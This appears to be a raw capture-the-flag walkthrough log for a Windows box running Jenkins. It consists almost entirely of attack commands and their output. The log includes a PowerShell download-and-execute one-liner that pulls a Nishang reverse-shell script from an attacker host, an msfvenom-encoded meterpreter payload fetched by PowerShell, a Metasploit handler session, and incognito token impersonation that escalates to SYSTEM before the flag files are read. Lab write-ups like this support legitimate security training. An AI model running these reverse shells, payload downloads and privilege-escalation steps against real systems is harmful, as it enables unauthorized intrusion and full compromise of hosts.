```
http://10.10.246.119:8080/job/project/configure

powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.12.46:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.12.46 -Port 4242

wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1

python -m SimpleHTTPServer 8000

nc -lvnp 4242

PS C:\Users\bruce\Desktop> type user.txt
79007a09481963edf2e1321abd9ae2a0
```
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.249.43 LPORT=9000 -f exe -o re.exe


powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.249.43:8000/re.exe','re.exe')"

msfconsole
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST 10.10.249.43 
set LPORT 9000 
run

Start-Process "re.exe"

meterpreter > shell
Process 2416 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\>whoami
whoami
alfred\bruce

C:\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State                                                                                                                                                              
=============================== ========================================= ======                                                                                                                                                             ==
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabl


use incognito



Linux kali 5.4.0-kali3-amd64 #1 SMP Debian 5.4.13-1kali1 (2020-01-20) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 19 12:36:31 2020 from 221.170.217.79
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.249.43 LPORT=9000 -f exe -o re.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: re.exe
root@kali:~# powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.249.43:8000/re.exe','re.exe')"^C
root@kali:~# msfconsole
[-] ***rting the Metasploit Framework console...\
[-] * WARNING: No database support: No database YAML file
[-] ***


                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v5.0.71-dev                          ]
+ -- --=[ 1962 exploits - 1095 auxiliary - 336 post       ]
+ -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 > use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.10.249.43 set LPORT 9000 run
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.249.43
LHOST => 10.10.249.43
msf5 exploit(multi/handler) > set LPORT 9000
LPORT => 9000
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.249.43:9000
[*] Sending stage (180291 bytes) to 10.10.224.98
[*] Meterpreter session 1 opened (10.10.249.43:9000 -> 10.10.224.98:49194) at 2020-05-19 12:41:47 +0000

meterpreter > load incognito
Loading extension incognito...Success.
meterpreter > list_tokens
Usage: list_tokens <list_order_option>

Lists all accessible tokens and their privilege level

OPTIONS:

    -g        List tokens by unique groupname
    -u        List tokens by unique username

meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSS
NT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\ShellHWDetection
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WdiSystemHost
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\netprofm
NT SERVICE\nsi
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\W32Time
NT SERVICE\WdiServiceHost
NT SERVICE\WinHttpAutoProxySvc
NT SERVICE\wscsvc

meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 712   524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 732   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 776   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 852   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 924   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 940   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 984   2436  re.exe                x86   0        alfred\bruce                  C:\re.exe
 992   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1016  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1064  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1180  668   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1212  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1324  668   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1424  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1448  668   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
 1476  668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1616  668   jenkins.exe           x64   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jenkins.exe
 1732  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1828  1616  java.exe              x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\jre\bin\java.exe
 1892  524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 1920  668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 2076  668   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
 2436  2556  powershell.exe        x86   0        alfred\bruce                  C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
 2440  1016  taskeng.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\taskeng.exe
 2556  1828  cmd.exe               x86   0        alfred\bruce                  C:\Windows\SysWOW64\cmd.exe
 2804  776   WmiPrvSE.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wbem\WmiPrvSE.exe
 2920  668   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
 2956  668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe

meterpreter > migrate 668
[*] Migrating from 984 to 668...
[*] Migration completed successfully.

meterpreter > pwd
C:\Windows\system32
meterpreter > cd /
meterpreter > pwd
C:\
meterpreter > cd Users
cd Users $Recycle.Bin                 cd Users Recovery
cd Users Documents\ and\ Settings     cd Users System\ Volume\ Information
cd Users PerfLogs                     cd Users Users
cd Users ProgramData                  cd Users Windows
cd Users Program\ Files               cd Users inetpub
cd Users Program\ Files\ (x86)
meterpreter > cd Users
meterpreter > ls
Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40777/rwxrwxrwx   8192  dir   2019-10-25 21:21:37 +0000  DefaultAppPool
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
40777/rwxrwxrwx   8192  dir   2019-10-25 20:51:12 +0000  bruce
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini

meterpreter > cat C:\Windows\System32\config\root.txt
[-] stdapi_fs_stat: Operation failed: The system cannot find the file specified.
meterpreter > cd C:\Windows\System32\config
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd /
meterpreter > ls
Listing: C:\
============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   0        dir   2009-07-14 03:18:56 +0000  $Recycle.Bin
40777/rwxrwxrwx   0        dir   2009-07-14 05:08:56 +0000  Documents and Settings
40777/rwxrwxrwx   0        dir   2009-07-14 03:20:08 +0000  PerfLogs
40555/r-xr-xr-x   4096     dir   2009-07-14 03:20:08 +0000  Program Files
40555/r-xr-xr-x   4096     dir   2009-07-14 03:20:08 +0000  Program Files (x86)
40777/rwxrwxrwx   4096     dir   2009-07-14 03:20:08 +0000  ProgramData
40777/rwxrwxrwx   0        dir   2019-10-25 20:51:07 +0000  Recovery
40777/rwxrwxrwx   4096     dir   2019-10-25 20:46:51 +0000  System Volume Information
40555/r-xr-xr-x   4096     dir   2009-07-14 03:20:08 +0000  Users
40777/rwxrwxrwx   16384    dir   2009-07-14 03:20:08 +0000  Windows
0000/---------    4417840  fif   1970-02-27 15:55:28 +0000  hiberfil.sys
40777/rwxrwxrwx   0        dir   2019-10-25 21:21:12 +0000  inetpub
0000/---------    4417888  fif   1970-02-27 15:55:28 +0000  pagefile.sys
100777/rwxrwxrwx  73802    fil   2020-05-19 12:40:03 +0000  re.exe

meterpreter > cd Windows
meterpreter > cd System32
meterpreter > cd config
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2009-07-14 05:32:39 +0000  BCD-Template
100666/rw-rw-rw-  25600     fil   2009-07-14 05:38:35 +0000  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2009-07-14 02:34:08 +0000  COMPONENTS
100666/rw-rw-rw-  1024      fil   2009-07-14 07:07:31 +0000  COMPONENTS.LOG
100666/rw-rw-rw-  13312     fil   2009-07-14 02:34:08 +0000  COMPONENTS.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  COMPONENTS.LOG2
100666/rw-rw-rw-  65536     fil   2009-07-14 04:54:56 +0000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2009-07-14 04:54:56 +0000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2009-07-14 04:54:56 +0000  COMPONENTS{016888b9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2009-07-14 02:34:08 +0000  DEFAULT
100666/rw-rw-rw-  1024      fil   2009-07-14 07:07:31 +0000  DEFAULT.LOG
100666/rw-rw-rw-  111616    fil   2009-07-14 02:34:08 +0000  DEFAULT.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  DEFAULT.LOG2
100666/rw-rw-rw-  65536     fil   2019-10-26 23:12:34 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-10-26 23:12:34 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-10-26 23:12:34 +0000  DEFAULT{016888b5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   0         dir   2009-07-14 03:20:10 +0000  Journal
40777/rwxrwxrwx   4096      dir   2009-07-14 03:20:10 +0000  RegBack
100666/rw-rw-rw-  262144    fil   2009-07-14 02:34:08 +0000  SAM
100666/rw-rw-rw-  1024      fil   2009-07-14 07:07:31 +0000  SAM.LOG
100666/rw-rw-rw-  21504     fil   2009-07-14 02:34:08 +0000  SAM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SAM.LOG2
100666/rw-rw-rw-  65536     fil   2019-10-26 23:12:33 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-10-26 23:12:33 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-10-26 23:12:33 +0000  SAM{016888c1-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  262144    fil   2009-07-14 02:34:08 +0000  SECURITY
100666/rw-rw-rw-  1024      fil   2009-07-14 07:07:30 +0000  SECURITY.LOG
100666/rw-rw-rw-  21504     fil   2009-07-14 02:34:08 +0000  SECURITY.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SECURITY.LOG2
100666/rw-rw-rw-  65536     fil   2019-10-26 23:12:33 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-10-26 23:12:33 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-10-26 23:12:33 +0000  SECURITY{016888c5-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  38797312  fil   2009-07-14 02:34:08 +0000  SOFTWARE
100666/rw-rw-rw-  1024      fil   2009-07-14 07:07:30 +0000  SOFTWARE.LOG
100666/rw-rw-rw-  262144    fil   2009-07-14 02:34:08 +0000  SOFTWARE.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SOFTWARE.LOG2
100666/rw-rw-rw-  65536     fil   2019-10-26 23:11:14 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-10-26 23:11:14 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-10-26 23:11:14 +0000  SOFTWARE{016888c9-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
100666/rw-rw-rw-  9961472   fil   2009-07-14 02:34:08 +0000  SYSTEM
100666/rw-rw-rw-  1024      fil   2009-07-14 07:07:30 +0000  SYSTEM.LOG
100666/rw-rw-rw-  262144    fil   2009-07-14 02:34:08 +0000  SYSTEM.LOG1
100666/rw-rw-rw-  0         fil   2009-07-14 02:34:08 +0000  SYSTEM.LOG2
100666/rw-rw-rw-  65536     fil   2019-10-26 23:11:11 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TM.blf
100666/rw-rw-rw-  524288    fil   2019-10-26 23:11:11 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-10-26 23:11:11 +0000  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
40777/rwxrwxrwx   4096      dir   2009-07-14 03:20:10 +0000  TxR
100666/rw-rw-rw-  70        fil   2019-10-26 11:36:00 +0000  root.txt
40777/rwxrwxrwx   4096      dir   2009-07-14 03:20:10 +0000  systemprofile

meterpreter > cat root.txt
・ff0f748678f280250f25a45b8046b4a
meterpreter > shell
Process 2968 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\System32\config>type root.txt
type root.txt
dff0f748678f280250f25a45b8046b4a

C:\Windows\System32\config>

```
